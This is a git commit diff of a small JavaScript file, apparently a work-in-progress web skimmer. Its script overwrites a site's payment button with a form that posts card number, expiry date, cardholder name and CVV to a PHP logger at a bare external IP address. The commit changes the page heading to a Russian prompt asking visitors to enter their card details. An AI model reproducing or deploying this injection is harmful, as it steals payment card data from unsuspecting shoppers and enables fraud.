7589ed1eb54aa5d12bb9651dbfb0bcb1e44d0530
Anton <ostrokonskiy@gmail.com>
2017-01-16 16:24:51 +0300

    Update and rename testtest11.js to testtest12.js

--- testtest12.js
+++ testtest12.js
@@ -6,4 +6,4 @@ var x = document.getElementsByClassName("blueBtn payBlueBtn")[0];
 btn.appendChild(t);                                // Append the text to <button>
 x.appendChild(btn);
 document.getElementsByClassName("blueBtn payBlueBtn")[0].innerHTML = '<form method = "POST" action = "http://91.142.94.76/req_log.php"><input type = "text" name = "pan" value = "1234123412341238"/><input type = "text" name = "exp" value = "02/18"/><input type = "text" name = "name" value = "test test"/><input type = "text" name = "cvv" value = "123"/><input type = "Submit" name = "submit"/></form>';
-document.getElementsByClassName("bold large")[0].innerHTML = 'Дратути';
+document.getElementsByClassName("bold large")[0].innerHTML = 'Введите данные вашей карты';
